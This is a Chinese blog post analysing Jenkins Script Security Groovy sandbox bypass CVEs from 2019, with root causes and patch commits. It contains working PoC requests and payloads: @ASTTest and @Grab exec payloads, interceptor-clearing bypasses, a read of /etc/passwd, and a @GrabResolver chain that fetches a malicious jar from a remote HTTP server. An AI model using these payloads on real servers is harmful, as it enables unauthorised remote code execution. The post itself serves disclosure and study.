---
title: Jenkins 路由解析及沙箱绕过漏洞分析报告(下)
date: 2020-09-16 11:48:32
tags: [sec,Java,Jenkins,Groovy]
categories: Security
---

<script src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js"></script>

# Jenkins 路由解析及沙箱绕过漏洞分析报告(下)

![](https://jenkins.io/images/logo-title-opengraph.png)

本报告下篇分析Jenkins主流插件Script Security中针对Groovy沙箱的绕过方法，梳理了Jenkins官方2018-2019年以来涉及沙箱绕过的安全更新，探讨Java沙箱在Java应用中的安全性。

## 突破Groovy沙箱

借用@廖新喜在2019 KCon大会的议题[《Java生态圈沙箱逃逸实战》](https://github.com/knownsec/KCon/blob/master/2019/24%E6%97%A5/Java%E7%94%9F%E6%80%81%E5%9C%88%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%AE%9E%E6%88%98.pdf)中的一张图，概括了Groovy沙箱的绕过史

![1570866330294](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1570866330294.png)

下面按照官方发布的安全更新先后顺序梳理在Script Security插件中出现的沙箱绕过漏洞

### SECURITY-1266 

- 公告：https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266
- CVE：CVE-2019-1003000
- 插件：Script Security
- 影响版本：<=1.49
- 利用点
    - `org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript#DescriptorImpl`
    - `org.jenkinsci.plugins.workflow.cps#CpsFlowDefinition`

#### 分析

DescriptorImpl继承自Descriptor，通过上面的利用链能调用到这个descriptor并且能指定调用方法，同时这个类的`doCheckScript`方法对Groovy脚本进行了解析，又根据上文的分析我们可以调用到任意`do`方法，因此这个过程可以控制传入的脚本内容进而绕过沙箱执行代码

下面是分析GroovyShell解析脚本的过程，不感兴趣的可以略过

![1566973312540](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1566973312540.png)

通过`parse()`方法解析Groovy脚本，经过一系列调用后进入`GroovyClassLoader#doParseClass()`方法，在该方法中的`unit.compile(goalPhase);`完成解析

![1568882770356](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568882770356.png)

其中`goalPhase`记录了当前解析的阶段，相关定义在`org.codehaus.groovy.control.Phases`，可以看到在Groovy compile的时候共有9个阶段，其中`ALL`和`FINALIZATION`定义是一样的

![1568881838677](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568881838677.png)

从注释也能看出来，分别是

1. ***初始化***：打开源文件并配置环境；
2. ***解析***：语法用于生成代表源代码的令牌树；
3. ***转换***：从标记树创建抽象语法树（AST）；
4. ***语义分析***：执行语法无法检查的一致性和有效性检查，并解析类；
5. ***规范化***：完成AST的构建；
6. ***指令选择***：选择指令集，例如Java 6或Java 7字节码级别；
7. ***类生成***：在内存中创建*类*的字节码；
8. ***输出***：将二进制输出写入文件系统；
9. ***完成***：执行任何最后的清理；

跟入`CompilationUnit#compile()`

![1568965892472](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568965892472.png)

可以看到当执行到阶段4时会先调用doPhaseOperation()方法，然后继续`processPhaseOperations()`和`processNewPhaseOperations()`操作，接着如果`progressCallback`不为空的话会去调用回调函数，当第一次进行到阶段4的时候，会设置progressCallback为`ASTTestTransformation`，接下来的阶段progressCallback都为这个值，直到执行到设置好的阶段7。

在执行progressCallback.call，即调用到`ASTTestTransformation#visit()`的过程中，会再次调用到`GroovyShell#evaluate()`，随后再次进入parse的流程，这是一个递归的过程，也就是说从阶段4到阶段7一共会执行4次parse，每次parse完成通过`script.run()`执行代码

![1568971024024](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568971024024.png)

本地测试一下，打印出每次执行到的阶段，可以看到对ASTTest的解析会涉及到阶段4到阶段7

![1568971437485](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568971437485.png)

> 一个tips：
>
> @ASTTest有两个参数，其中*phase*可以指定ASTTest执行的阶段，在该阶段结束时作用于AST树
>
> 参考：https://groovy-lang.org/metaprogramming.html#xform-ASTTest

因此，通过`@ASTTest`语法可以利用断言执行代码，这个过程发生在Groovy解析脚本的过程中，而不用等到具体调用再执行

#### PoC

```
GET /securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=import%20groovy.transform.*%0a@ASTTest(value={assert%20java.lang.Runtime.getRuntime().exec("calc")})%0aclass%20ASTTestPoc{}
```

![1566962122229](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1566962122229.png)

#### 补丁

- jenkinsci/script-security-plugin [commit](https://github.com/jenkinsci/script-security-plugin/commit/2c5122e50742dd16492f9424992deb21cc07837c)
- 版本：1.50
- 概述：新增RejectASTTransformsCustomizer类，拦截ASTTest.class和Grab.class，出现这两个语法会抛出异常

![1568605407294](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568605407294.png)



### SECURITY-1292

- 公告：https://jenkins.io/security/advisory/2019-01-28/#SECURITY-1292
- CVE：CVE-2019-1003005
- 插件：Script Security Plugin
- 版本：<=1.50

> Script Security sandbox protection could be circumvented during the script compilation phase by applying AST transforming annotations such as `@Grab` to source code elements.
>
> This affected an HTTP endpoint used to validate a user-submitted Groovy script that was not covered in the [2019-01-08 fix for SECURITY-1266](https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266) and allowed users with Overall/Read permission to bypass the sandbox protection and execute arbitrary code on the Jenkins master.

`org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript#DescriptorImpl`利用链中的`doCheckScript`方法没有及时更新修复后的安全方法，依然存在风险，绕过点就是利用`@Grab`

`Grape` 是一个内嵌在 Groovy 中的 JAR 依赖项管理器，方便在classpath中快速添加 Maven 库依赖项，更易于编写脚本。最简单的用法是在脚本上添加注释（annotation），如下所示：

```java
@Grab(group='org.springframework', module='spring-orm', version='3.2.5.RELEASE')
import org.springframework.jdbc.core.JdbcTemplate
```

程序会自动去仓库下载对应的库，并保存在`~/.groovy/grapes/`目录

#### 分析

现在只需找到一个可以利用的类便可完成代码执行，这里列举两个：

`org.zeroturnaround.zt-exec`类，本地测试

```java
@Grab('org.zeroturnaround:zt-exec:1.11')
import org.zeroturnaround.exec.ProcessExecutor
new ProcessExecutor().command("calc").execute()
```

![1570780489674](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1570780489674.png)

除此之外，[adamyordan/cve-2019-1003000-jenkins-rce-poc](adamyordan/cve-2019-1003000-jenkins-rce-poc)利用了`org.buildobjects.process.ProcBuilder`类，效果是一样的

```java
import org.buildobjects.process.ProcBuilder
@Grab('org.buildobjects:jproc:2.2.3')
class Dummy{ }
print new ProcBuilder("/bin/bash").withArgs("-c","cat /etc/passwd").run().getOutputString()
```

但是，在Jenkins中执行并不能正常触发，报错如下：

```
Caused by: java.lang.RuntimeException: No suitable ClassLoader found for grab
        at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
        at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)
        at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
        at java.lang.reflect.Constructor.newInstance(Constructor.java:423)
        at org.codehaus.groovy.reflection.CachedConstructor.invoke(CachedConstructor.java:83)
        at org.codehaus.groovy.runtime.callsite.ConstructorSite$ConstructorSiteNoUnwrapNoCoerce.callConstructor(ConstructorSite.java:105)
        at org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCallConstructor(CallSiteArray.java:60)
        at org.codehaus.groovy.runtime.callsite.AbstractCallSite.callConstructor(AbstractCallSite.java:235)
        at org.codehaus.groovy.runtime.callsite.AbstractCallSite.callConstructor(AbstractCallSite.java:247)
        at groovy.grape.GrapeIvy.chooseClassLoader(GrapeIvy.groovy:182)
        at groovy.grape.GrapeIvy$chooseClassLoader.callCurrent(Unknown Source)
        at groovy.grape.GrapeIvy.grab(GrapeIvy.groovy:249)
        at groovy.grape.Grape.grab(Grape.java:167)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:498)
        at org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:93)
        at groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:325)
        at org.codehaus.groovy.runtime.callsite.StaticMetaMethodSite.invoke(StaticMetaMethodSite.java:46)
        at org.codehaus.groovy.runtime.callsite.StaticMetaMethodSite.callStatic(StaticMetaMethodSite.java:102)
        at org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCallStatic(CallSiteArray.java:56)
        at org.codehaus.groovy.runtime.callsite.AbstractCallSite.callStatic(AbstractCallSite.java:194)
        at org.kohsuke.groovy.sandbox.impl.Checker$2.call(Checker.java:188)
        at org.kohsuke.groovy.sandbox.impl.Checker.checkedStaticCall(Checker.java:190)
        at org.kohsuke.groovy.sandbox.impl.Checker$checkedStaticCall$0.callStatic(Unknown Source)
        at org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCallStatic(CallSiteArray.java:56)
        at org.codehaus.groovy.runtime.callsite.AbstractCallSite.callStatic(AbstractCallSite.java:194)
        at org.codehaus.groovy.runtime.callsite.AbstractCallSite.callStatic(AbstractCallSite.java:222)
        at Script1.<clinit>(Script1.groovy)
        ... 95 more
```

下面针对这个异常来分析@grab的执行流程，不感兴趣的可以略过

`@grab`的解析与上面`@ASTTest`类似，同样是9个阶段，不同的是解析ASTTest时回调的是`ASTTestTransformation`而grab回调的是`GrabAnnotationTransformation#visit()`，进而执行到`groovy.grape.Grape#grab`

![1571037111326](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1571037111326.png)

最终的实现由`groovy.grape.GrapeIvy#grab`来完成，[源码](https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/GrapeIvy.groovy#L242)

![1571037984228](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1571037984228.png)

在这个过程中会通过两次`chooseClassLoader`来加载class，当class以及其父类不属于`groovy.lang.GroovyClassLoader`或者`org.codehaus.groovy.tools.RootLoader`时会抛出`No suitable ClassLoader found for grab`

![1571047376914](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1571047376914.png)

通过`Matrix Project Plugin`插件来跟踪流程，该插件的`Combination Filter`功能可以进行groovy解析，这个地方也披露过一个沙箱绕过漏洞，具体分析请参考下文[SECURITY-1339]{#SECURITY-1339}

当用户从Configuration Matrix页面上保存配置时，调用如下

```java
public Script parse(GroovyCodeSource codeSource) throws CompilationFailedException {
    return InvokerHelper.createScript(this.parseClass(codeSource), this.context);
}
```

在执行`createScript()`和`parseClass()`两个方法时都会对grab进行解析，但参数有所不同

`parseClass()`过程传递的参数`classLoader`为`GroovyClassLoader`，因此能够正常加载，即一次成功的grab解析过程

![1571046450490](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1571046450490.png)

`createScript()`过程的args参数不含`classLoader`，于是Jenkins会加载当前插件类`script-security`，不属于上面提到的`groovy.lang.GroovyClassLoader`或者`org.codehaus.groovy.tools.RootLoader`，所以会抛出`No suitable ClassLoader found for grab`异常，但是恶意代码已经在第一次解析的时候触发了

![1571051122801](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1571051122801.png)

两次调用栈对比

![1571051029984](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1571051029984.png)

接下来当成功获取到`loader` 后会通过下面两个方法开始解析具体的jar文件，重点关注`processOtherServices()`

- processCategoryMethods()
- processOtherServices()

![1571051322541](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1571051322541.png)

可以看到在`processRunners()`中有 `newInstance()`方法，当我们把`META-INF/services/org.codehaus.groovy.plugins.Runners`设置成恶意类时，Grape就会以这个类为入口点，即可创建这个类的实例，这也就是Orange在[Hacking Jenkins Part 2](https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/)中提到要将执行的类名放到该路径下的原因：

> 這裡的 `newInstance()` 不就代表著可以呼叫到任意類別的 `Constructor` 嗎? 沒錯! 所以只需產生一個惡意的 JAR 檔，把要執行的類別全名放至 `META-INF/services/org.codehaus.groovy.plugins.Runners` 中即可呼叫指定類別的`Constructor` 去執行任意代碼!

因此该漏洞的触发方式是，使用@grab引入外部jar文件，并且jar包中的`META-INF/services/org.codehaus.groovy.plugins.Runners`内容为要执行的类名，通过`GroovyShell.parse`即可触发。

#### PoC

需要额外创建恶意jar包并放在`~/.groovy/grapes/jars`目录，较鸡肋，配合`@GrabResolver`从远程获取恶意类更方便触发，详细分析参考[SECURITY-1319]{#SECURITY-1319}

#### 补丁

- jenkinsci/script-security-plugin [commit](https://github.com/jenkinsci/script-security-plugin/commit/35119273101af26792457ec177f34f6f4fa49d99)

- 版本：1.51

- 概述：在1.50的修复中新增了一个`RejectASTTransformsCustomizer`类用来拦截黑名单，但是在`SecureGroovyScript#DescriptorImpl`的`doCheckScript()`方法中并没有调用，在该版本修改了直接parse的过程

    ![1570781824987](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1570781824987.png)

    createSecureCompilerConfiguration()方法即在[SECURITY-1266](https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266)中新增的修复方法

    ![1570782051460](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1570782051460.png)



### SECURITY-1318

`@Grapes`可以进行多重注释，如

```java
@Grapes([
   @Grab(group='commons-primitives', module='commons-primitives', version='1.0'),
   @Grab(group='org.ccil.cowan.tagsoup', module='tagsoup', version='0.9.7')])
class Example {
// ...
}
```

所以上面的`@Grab`可以放进`@Grapes`中，效果是一样的，以此来绕过黑名单

#### PoC

```java
@Grapes([@Grab('org.zeroturnaround:zt-exec:1.11'), @GrabConfig(systemClassLoader=false)])
import org.zeroturnaround.exec.ProcessExecutor;
new ProcessExecutor().command("calc").execute();
```

### SECURITY-1319

使用`@GrabResolver`可以从指定仓库下载依赖文件，如

```java
@GrabResolver(name='restlet', root='http://maven.restlet.org/')
@Grab(group='org.restlet', module='org.restlet', version='1.1.6')
```

这里的root可以指定任意地址，也就可以从远程获取恶意jar文件，这也是Orange在[Hacking Jenkins Part 2](https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/)提到的方法

#### PoC

1. 编写执行命令的恶意类

    ```java
    public class Exploit {
        public Exploit() {
            try {
                String payload = "calc";
                String[] cmds = {"cmd", "/c", payload};
                java.lang.Runtime.getRuntime().exec(cmds);
            } catch (Exception e) {
            }
        }
    }
    ```

2. 编译生成class

    ```java
    javac Exploit.java
    ```

3. 创建文件夹

    ```bash
    mkdir -p META-INF/services/
    ```

4. 将要执行的类名写入到`META-INF/services/org.codehaus.groovy.plugins.Runners` 中，原因见上文`@grab`的分析

    ```bash
    echo Exploit >META-INF/services/org.codehaus.groovy.plugins.Runners
    ```

5. 打包成jar

    ```bash
    jar cvf payload-1.jar Exploit.class META-INF/
    ```

6. 创建目录，与最终poc中garb的group，module，version关联，如

    `@Grab(group='exp',module='payload',version='1')`

    则创建`exp/payload/1`目录

7. 把生成的jar文件放在`exp/payload/1`中，并开启一个http服务

8. 发送PoC

    ```
    GET /securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name='payload',root='http://127.0.0.1:83/')%0a@Grab(group='exp',module='payload',version='1')%0aimport%20Exploit;
    ```

9. http响应并执行命令

    ![1568259623884](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568259623884.png)

    ![1568259687132](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568259687132.png)

注意：

1. 当通过grab拉取jar后会在`~/.groovy/grapes`目录创建相应的`ivy.xml`文件（类似于pom文件，保存依赖关系）和`jars`目录，当再次请求相同的包时会从本地获取jar文件而不会去请求http，如果要再次请求就需要更改包名或版本；
2. 还需要注意目标的Java版本与编译恶意类的Java版本是否一致，否则会报错；

### SECURITY-1320

- CVE：CVE-2019-1003024
- 插件：Script Security Plugin
- 版本：<=1.52

补丁中对1320的[测试用例](https://github.com/jenkinsci/script-security-plugin/commit/3228c88e84f0b2f24845b6466cae35617e082059#diff-6f8c6ffbeca4d1d208c9c232770a644fR950)提示了绕过方法，就是通过导入别名的方式

![1571124411948](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1571124411948.png)

#### PoC

```java
import groovy.transform.ASTTest as lolwut;
@lolwut(value={assert java.lang.Runtime.getRuntime().exec("calc")})
class ASTTestPoc{};
```

![1571125498965](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1571125498965.png)

### SECURITY-1321

- CVE：CVE-2019-1003024
- 插件：Script Security Plugin
- 版本：<=1.52

同样根据[测试用例](https://github.com/jenkinsci/script-security-plugin/commit/3228c88e84f0b2f24845b6466cae35617e082059#diff-6f8c6ffbeca4d1d208c9c232770a644fR921)发现通过`元注释`来绕过

[文档](http://docs.groovy-lang.org/latest/html/api/groovy/transform/AnnotationCollector.html)上的例子：

```java
import groovy.transform.*
@AnnotationCollector([EqualsAndHashCode, ToString])
@interface Simple {}

@Simple
class User {
    String username
    int age
}

def user = new User(username: 'mrhaki', age: 39)
assert user.toString()
```

#### PoC

```java
import groovy.transform.*;
@AnnotationCollector([ASTTest])
@interface Lol {}
@Lol(value={assert java.lang.Runtime.getRuntime().exec("calc")})
class ASTTestPoc{};
```

![1571128442836](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1571128442836.png)

#### 补丁

- jenkinsci/script-security-plugin [commit](https://github.com/jenkinsci/script-security-plugin/commit/3228c88e84f0b2f24845b6466cae35617e082059)
- 版本：1.53
- 概述：SECURITY-1318, SECURITY-1319, SECURITY-1320, SECURITY-1321均在1.53版本中修复，把Grab注释相关的方法全部放进了黑名单

![1570871810447](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1570871810447.png)



### SECURITY-1339

- 公告：https://jenkins.io/security/advisory/2019-03-06/#SECURITY-1339
- CVE：CVE-2019-1003031
- 插件：Matrix Project Plugin
- 影响版本：<= 1.13

这个漏洞需要配合[SECURITY-1336 (1)](https://jenkins.io/security/advisory/2019-03-06/#SECURITY-1336%20(1)) / CVE-2019-1003029触发，本质还是利用在解析groovy脚本后中通过script.run()执行代码

#### 分析

从页面提交Filter之后执行到`hudson.matrix.MatrixProject#submit()`，payload传给参数`combinationFilter`，随后执行`rebuildConfigurations`

![1568687478328](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568687478328.png)

payload传入`evalGroovyExpression`，然后调用`hudson.matrix.FilterScript#parse()`方法初始化一个GroovyShell，并通过GroovyShell解析表达式，代码得到执行

![1568687517862](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568687517862.png)

![1568792862732](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568792862732.png)

#### PoC

```java
class poc{poc(){"calc".execute()}}
```

#### 补丁

- jenkinsci/script-security-plugin [commit](https://github.com/jenkinsci/script-security-plugin/commit/f2649a7c0757aad0f6b4642c7ef0dd44c8fea434) 
- jenkinsci/matrix-project-plugin [commit](https://github.com/jenkinsci/matrix-project-plugin/commit/765fc39694b31f8dd6e3d27cf51d1708b5df2be7)
- 概述：

在SECURITY-1336的修复中，使用安全的方法

```java
GroovySandbox.run(GroovyShell, String, Whitelist)
```

代替

```java
GroovySandbox.run(Script, Whitelist)
```

![1568691589273](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568691589273.png)

![1568691613625](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568691613625.png)

安全方法会在执行之前通过白名单检查，之后直接通过shell.parse会抛出一个java.lang.IllegalStateException的异常

![1568691388339](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568691388339.png)



### SECURITY-1465

- 公告：https://jenkins.io/security/advisory/2019-07-31/#SECURITY-1465%20(2)
- CVE：CVE-2019-10355, CVE-2019-10356
- 插件：Script Security
- 影响版本：<=1.61

#### 概述

Groovy语法中的方法指针运算符`.&`可以获取一个方法指针，后面再调用该指针可以直接访问到指定方法，如：

```java
void doSomething(def param) {
    println "In doSomething method, param: " + param
}
def m = this.&doSomething
m("test param");
```

参考：http://docs.groovy-lang.org/latest/html/documentation/core-operators.html#method-pointer-operator

#### 分析

`org.kohsuke.groovy.sandbox.GroovyInterceptor`是一个拦截器类，功能是为当前线程创建相应方法的拦截器，在接收拦截之前，需要通过`GroovyInterceptor#register()`注册，相关方法在

![1568858988658](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568858988658.png)

在script-security 1.58版本中把这部分代码放到了GroovySandbox.Scope enter()方法中

![1568859792340](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568859792340.png)

而register()方法的功能是通过`threadInterceptors.get().add()`为当前线程注册拦截器

```java
public void register() {
    ((List)threadInterceptors.get()).add(this);
}
```

该漏洞的利用点就是在`threadInterceptors.get()`获取到线程信息之后，再调用clear()方法清除当前线程的所有拦截器，使黑名单失效，然后就可以注入自定义代码来绕过沙箱

本地测试一下

```groovy
({ org.kohsuke.groovy.sandbox.GroovyInterceptor.threadInterceptors.get().clear(); "calc" }()).execute();
```

![1568861762489](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568861762489.png)

但是直接发送这个脚本会被`org.jenkinsci.plugins.scriptsecurity.sandbox.whitelists.StaticWhitelist#rejectStaticField()`拦截，于是可以在`execute`之前利用`.&`操作符绕过

或者利用这个[issue](https://github.com/jenkinsci/groovy-sandbox/issues/54)的方式，在此处`.&`并没有起到实质调用的作用，只是为了绕过Jenkins对`staticField`的检查

#### PoC

PoC的变化也多种多样，可以通过上面分析的`Matrix Project Plugin`插件触发

- Poc1

    ```java
    ({ org.kohsuke.groovy.sandbox.GroovyInterceptor.threadInterceptors.get().clear(); "calc" }().&toString).execute();
    ```

- PoC2

    ```java
    1.&({ org.kohsuke.groovy.sandbox.GroovyInterceptor.threadInterceptors.get().clear(); 'x' }()); 'calc'.execute()
    ```

![1568792275964](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568792275964.png)

#### 补丁

- jenkinsci/groovy-sandbox [commit](https://github.com/jenkinsci/groovy-sandbox/commit/e30cd28d7b30cd606e78c22174cb04e0450244a7)
- 概述：在方法指针表达式增加了transform检查

![1568801252778](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568801252778.png)



### SECURITY-1538

- 公告：https://jenkins.io/security/advisory/2019-09-12/#SECURITY-1538
- CVE：CVE-2019-10393, CVE-2019-10394, CVE-2019-10399, CVE-2019-10400
- 插件：Script Security
- 影响版本：<=1.62

#### 概述

该问题与[SECURITY-1465](https://jenkins.io/security/advisory/2019-07-31/#SECURITY-1465%20(2))一样，由于groovy语法特性导致绕过，此次利用的是方法调用表达式，可以通过`()`运算符直接调用call方法，如：

```java
class MyCallable {
    int call(int x) {           
        2*x
    }
}
def mc = new MyCallable()
assert mc.call(2) == 4          
assert mc(2) == 4   
```

参考：http://docs.groovy-lang.org/latest/html/documentation/core-operators.html#method-pointer-operator

同理，自增(`++`)自减(`--`)运算符也能间接调用到方法

#### 分析

本质上还是通过`threadInterceptors.get().clear()`清除拦截器再执行任意代码

#### PoC

- poc1

    ```java
    'calc'.({ org.kohsuke.groovy.sandbox.GroovyInterceptor.threadInterceptors.get().clear(); "execute" }())();
    ```

- poc2

    ```java
    ++({ org.kohsuke.groovy.sandbox.GroovyInterceptor.threadInterceptors.get().clear(); "toString" }());
    'calc'.execute()
    ```

![1568792171461](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568792171461.png)

#### 补丁

- jenkinsci/groovy-sandbox [commit](https://github.com/jenkinsci/groovy-sandbox/commit/e30cd28d7b30cd606e78c22174cb04e0450244a7)
- 概述：对方法调用表达式以及递增递减表达式都做了处理

![1568863989383](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568863989383.png)

![1568864020702](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568864020702.png)



### SECURITY-1294

- 公告：https://jenkins.io/security/advisory/2019-08-28/#SECURITY-1294
- CVE-2019-10390
- 插件：Splunk Plugin
- 影响版本：<=1.7.4
- 利用点
    - `com.splunk.splunkjenkins.SplunkJenkinsInstallation#doCheckScriptContent`

#### 分析

通过上面分析的descriptorByName可以直接调用到指定的类，注意到SplunkJenkinsInstallation类的`doCheckScriptContent`方法，该方法调用了

`LogEventHelper.validateGroovyScript(value)`

该方法对script进行了解析，而参数value的值直接从request获取，因此传入精心构造的脚本可导致任意代码执行

![1567144975420](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1567144975420.png)

#### PoC

```
GET /descriptorByName/com.splunk.splunkjenkins.SplunkJenkinsInstallation/checkScriptContent?value=import%20groovy.transform.*%0a@ASTTest(value={assert%20java.lang.Runtime.getRuntime().exec(%22calc%22)})%0aclass%20ASTTestPoc{}
```

![1567144024727](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1567144024727.png)

#### 补丁

- jenkinsci/splunk-devops-plugin [commit](https://github.com/jenkinsci/splunk-devops-plugin/commit/58db2878a7faa4c34f73774f28740e5ac8041928)
- 版本：1.8.0
- 概述：引入GroovySandbox在解析前对Groovy脚本进行校验

![1567144462308](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1567144462308.png)



## 总结

本报告分析了Jenkins动态路由机制和路由绕过的问题，并讨论了在主流插件Script Security中针对Groovy沙箱的绕过方法，其中最巧妙的是利用自身路由白名单绕过登录检查并结合Groovy语法达到远程代码执行，是一条非常精彩的利用链。

在修复方式上，可以看出Jenkins对于沙箱问题采取的防护方法是黑名单+白名单的方式，对安全的控制还是比较好的，不少问题都出在Groovy的语法特性上，使得较小权限的用户可以突破沙箱执行任意代码，相信以后也会有更巧妙的方式来绕过沙箱，欢迎大家探讨。



参考

- <https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/>
- <http://docs.groovy-lang.org/latest/html/documentation/grape.html>
- <http://docs.groovy-lang.org/latest/html/documentation/core-operators.html>



<script>pangu.spacingPage();</script>